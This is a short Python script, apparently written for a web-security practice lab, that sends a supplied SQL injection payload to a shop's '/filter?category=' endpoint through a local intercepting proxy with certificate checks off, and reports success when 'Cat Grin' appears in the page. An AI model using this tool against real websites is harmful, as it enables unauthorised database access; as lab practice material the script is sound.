import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False , proxies=proxies)

    if 'Cat Grin' in r.text:
        return True
    else:
        return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print('[*] Usage: %s <url> <payload>' % sys.argv[0])
        sys.exit(-1)

    if sqli(url, payload):
        print('[*] sql injection successful.....')
    else:
        print('[-] sql injection unsuccessful')